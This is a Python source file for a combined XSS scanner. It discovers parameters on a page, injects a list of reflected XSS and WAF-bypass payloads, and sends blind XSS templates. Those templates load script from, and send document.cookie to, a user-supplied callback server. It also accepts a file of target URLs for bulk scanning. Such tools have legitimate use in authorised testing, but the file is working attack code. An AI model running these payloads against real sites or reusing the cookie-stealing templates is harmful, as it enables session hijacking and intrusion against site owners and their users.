# -*- coding: utf-8 -*-
"""
XSS Scanner — Merged & Enhanced
Combines: xss.py (reflected) + blind_xss.py (OOB) + xssfinder (DOM scraping, param discovery)
"""

import sys
import re
import argparse
import requests
import urllib3
from urllib import parse
from urllib.parse import urlencode

try:
    from bs4 import BeautifulSoup
    BS4 = True
except ImportError:
    BS4 = False

try:
    from colorama import init, Fore
    init(autoreset=True)
    COLOR = True
except ImportError:
    COLOR = False
    class Fore:
        GREEN = RED = YELLOW = CYAN = BLUE = MAGENTA = RESET = ""

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─────────────────────────────────────────
# 🧠  META  (framework compat)
# ─────────────────────────────────────────

meta = {
    "name":        "XSS Scanner (Merged)",
    "severity":    "High",
    "description": "Reflected + Blind XSS with DOM-based param discovery",
}

inputs = ["param"]

# ─────────────────────────────────────────
# 🎨  OUTPUT HELPERS
# ─────────────────────────────────────────

def info(msg):    print(Fore.CYAN    + f"[*] {msg}")
def ok(msg):      print(Fore.GREEN   + f"[+] {msg}")
def warn(msg):    print(Fore.YELLOW  + f"[!] {msg}")
def fail(msg):    print(Fore.RED     + f"[-] {msg}")
def section(msg): print(Fore.MAGENTA + f"\n{'─'*55}\n    {msg}\n{'─'*55}")

# ─────────────────────────────────────────
# 📋  PAYLOADS
# ─────────────────────────────────────────

REFLECTED_PAYLOADS = [
    # Basic
    "<script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    # Attribute breakout
    "\" onmouseover=\"alert(1)",
    "' onmouseover='alert(1)",
    "javascript:alert(1)",
    # Filter evasion
    "<ScRiPt>alert(1)</ScRiPt>",
    "<img src=x onerror=\"alert`1`\">",
    "<svg><script>alert(1)</script></svg>",
    "<body onload=alert(1)>",
    # Polyglots
    "';alert(1)//",
    "\"><img src=x onerror=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    # WAF bypass
    "<svg onload=alert&#40;1&#41;>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "<details/open/ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
]

BLIND_PAYLOADS_TEMPLATE = [
    '<script src="{server}"></script>',
    '<img src="{server}" onerror="this.src=\'{server}?c=\'+document.cookie">',
    '"><script src="{server}"></script>',
    "'><script src=\"{server}\"></script>",
    '<svg onload="fetch(\'{server}?c=\'+document.cookie)">',
]

HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    )
}

# ─────────────────────────────────────────
# 🔍  DOM PARAM DISCOVERY  (from xssfinder)
# ─────────────────────────────────────────

def discover_params(url, verbose=False):
    """
    Scrape the page and extract potential parameters from:
      - input/textarea/select/button name & id attributes
      - data-* attributes
      - JavaScript var declarations
      - Existing GET parameters in the URL
    Returns a deduplicated list of parameter names.
    """
    params = []
    try:
        if verbose:
            info(f"Scraping {url} for parameters...")
        r = requests.get(url, headers=HEADERS, verify=False, timeout=15,
                         allow_redirects=False)
        content = r.text

        # Existing URL params
        parsed = parse.urlparse(url)
        url_params = list(parse.parse_qs(parsed.query).keys())
        params += url_params

        # data-* attributes
        data_attrs = re.findall(r' data-([a-zA-Z0-9\-_]+)', content)
        params += data_attrs

        # name/id attributes on form elements
        elements = re.findall(r' (?:name|id)=["\']?([a-zA-Z0-9\-_]+)["\']?', content)
        params += elements

        # JS var declarations
        js_vars = re.findall(r'var\s+([a-zA-Z0-9\-_]+)\s*=', content)
        params += js_vars

        # BeautifulSoup deep scan (if available)
        if BS4:
            soup = BeautifulSoup(content, "html.parser")
            for tag in soup.find_all(["input", "textarea", "select", "button"]):
                for attr in ("name", "id"):
                    v = tag.get(attr)
                    if v:
                        params.append(v)

        unique = list(dict.fromkeys(p for p in params if p))
        if verbose:
            ok(f"Discovered {len(unique)} parameter(s): {', '.join(unique)}")
        return unique

    except Exception as e:
        warn(f"Param discovery error: {e}")
        return []

# ─────────────────────────────────────────
# 🔥  REFLECTED XSS SCAN
# ─────────────────────────────────────────

def scan_reflected(url, params, verbose=False):
    """
    Test each param with every reflected XSS payload.
    Returns list of findings dicts.
    """
    findings = []
    try:
        baseline = requests.get(url, headers=HEADERS, verify=False,
                                timeout=15, allow_redirects=False)
        baseline_len = len(baseline.content)
    except Exception as e:
        warn(f"Baseline fetch failed: {e}")
        return findings

    for param in params:
        for payload in REFLECTED_PAYLOADS:
            try:
                # Build URL keeping other params intact
                parsed = parse.urlparse(url)
                qs = dict(parse.parse_qsl(parsed.query))
                qs[param] = payload
                test_url = parse.urlunparse(
                    parsed._replace(query=parse.urlencode(qs))
                )

                r = requests.get(test_url, headers=HEADERS, verify=False,
                                 timeout=10, allow_redirects=False)

                # WAF hints
                if r.status_code in (403, 406, 429):
                    warn(f"WAF? HTTP {r.status_code} on param='{param}' payload='{payload[:30]}...'")
                    continue

                # Detection: payload reflected verbatim in body
                if payload.lower() in r.text.lower():
                    ok(f"Reflected XSS | param='{param}' | payload='{payload}'")
                    findings.append({
                        "type":    "reflected",
                        "param":   param,
                        "payload": payload,
                        "url":     test_url,
                        "status":  r.status_code,
                    })
                    break  # one hit per param is enough
                elif verbose:
                    fail(f"No reflection | param='{param}' | payload='{payload[:40]}'")

            except Exception as e:
                if verbose:
                    warn(f"Request error | param='{param}': {e}")

    return findings

# ─────────────────────────────────────────
# 👻  BLIND XSS SCAN
# ─────────────────────────────────────────

def scan_blind(url, params, callback_server, verbose=False):
    """
    Inject blind XSS payloads pointing to callback_server into every param.
    Since blind XSS fires asynchronously (in an admin panel etc.), we can only
    confirm the payload was *sent*, not that it executed.
    Returns list of sent-payload records.
    """
    sent = []
    for param in params:
        for template in BLIND_PAYLOADS_TEMPLATE:
            payload = template.format(server=callback_server)
            try:
                qs = {param: payload}
                test_url = f"{url}?{urlencode(qs)}"
                r = requests.get(test_url, headers=HEADERS, verify=False,
                                 timeout=10, allow_redirects=False)
                ok(f"Blind payload sent | param='{param}' | status={r.status_code}")
                sent.append({
                    "type":    "blind",
                    "param":   param,
                    "payload": payload,
                    "url":     test_url,
                    "status":  r.status_code,
                })
                if verbose:
                    info(f"  payload: {payload[:60]}")
            except Exception as e:
                warn(f"Blind send error | param='{param}': {e}")
    return sent

# ─────────────────────────────────────────
# 🎯  UNIFIED scan()  — framework-compatible
# ─────────────────────────────────────────

def scan(url, param="input", blind_server=None, verbose=False):
    """
    Full XSS scan: reflected + (optionally) blind.
    param: comma-separated list, or single param name.
           If 'auto', params are discovered from the DOM.
    blind_server: URL of your OOB callback server (e.g. http://yourserver.com/xss.js)
    Returns: dict { vulnerable, result, severity, details }
    """
    # ── Resolve param list ────────────────
    if param == "auto":
        params = discover_params(url, verbose=verbose)
        if not params:
            warn("No params discovered, trying 'q', 'id', 'search' as fallback.")
            params = ["q", "id", "search", "name", "input"]
    else:
        params = [p.strip() for p in param.split(",") if p.strip()]

    all_findings = []

    # ── Reflected ─────────────────────────
    section("Reflected XSS scan")
    reflected = scan_reflected(url, params, verbose=verbose)
    all_findings += reflected

    # ── Blind ─────────────────────────────
    if blind_server:
        section("Blind XSS scan")
        blind = scan_blind(url, params, blind_server, verbose=verbose)
        all_findings += blind

    # ── Result ────────────────────────────
    section("Scan complete")
    reflected_hits = [f for f in all_findings if f["type"] == "reflected"]
    blind_hits     = [f for f in all_findings if f["type"] == "blind"]

    parts = []
    if reflected_hits:
        parts.append(f"Reflected XSS confirmed on {len(reflected_hits)} param(s)")
    if blind_hits:
        parts.append(f"Blind XSS payloads sent to {len(blind_hits)} endpoint(s) — "
                     "watch your callback server")

    if parts:
        ok(" | ".join(parts))
        return {
            "vulnerable": True,
            "result":     " | ".join(parts),
            "severity":   "High",
            "details":    all_findings,
        }

    fail("No XSS detected")
    return {
        "vulnerable": False,
        "result":     "No XSS detected",
        "severity":   "Low",
        "details":    [],
    }

# ─────────────────────────────────────────
# 🖥️  CLI ENTRY-POINT
# ─────────────────────────────────────────

def main():
    print(Fore.GREEN + r"""
  __  _______ _____    _____
  \ \/ / ____/ ____|  / ____|
   \  /| (___| (___  | (___   ___ __ _ _ __  _ __   ___ _ __
   /  \ \___ \\___ \  \___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
  / /\ \____) |___) | ____) | (_| (_| | | | | | | |  __/ |
 /_/  \_\____/_____/ |_____/ \___\__,_|_| |_|_| |_|\___|_|

     Merged v2.0 — Reflected + Blind + DOM param discovery
""")

    parser = argparse.ArgumentParser(
        description="XSS Scanner — Reflected + Blind + DOM param discovery"
    )
    parser.add_argument("-u", "--url",    required=True,
                        help="Target URL (e.g. http://site.com/page.php?id=1)")
    parser.add_argument("-p", "--param",  default="auto",
                        help="Param name(s) comma-separated, or 'auto' for DOM discovery (default: auto)")
    parser.add_argument("-b", "--blind",  default=None,
                        help="Blind XSS callback server URL (e.g. http://yourserver.com/xss.js)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output")
    parser.add_argument("-f", "--file",   default=None,
                        help="File with list of URLs (one per line)")

    args = parser.parse_args()

    def run_one(url):
        if not url.startswith(("http://", "https://")):
            fail(f"Invalid URL (must start with http/https): {url}")
            return
        result = scan(url, param=args.param,
                      blind_server=args.blind, verbose=args.verbose)
        print()
        if result["vulnerable"]:
            ok(f"[!!!] VULNERABLE — {result['result']}")
            for d in result["details"]:
                if d["type"] == "reflected":
                    info(f"  param={d['param']}  payload={d['payload']}")
        else:
            fail(f"[+]  NOT vulnerable — {result['result']}")

    if args.file:
        try:
            with open(args.file) as f:
                urls = [u.strip() for u in f if u.strip()]
            info(f"Loaded {len(urls)} URL(s) from {args.file}")
            for url in urls:
                run_one(url)
        except FileNotFoundError:
            fail(f"File not found: {args.file}")
    else:
        run_one(args.url)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        warn("\nInterrupted by user.")
    except Exception as e:
        print(Fore.RED + f"[!] Unexpected error: {e}")
    finally:
        input(Fore.CYAN + "\nPress Enter to exit.")
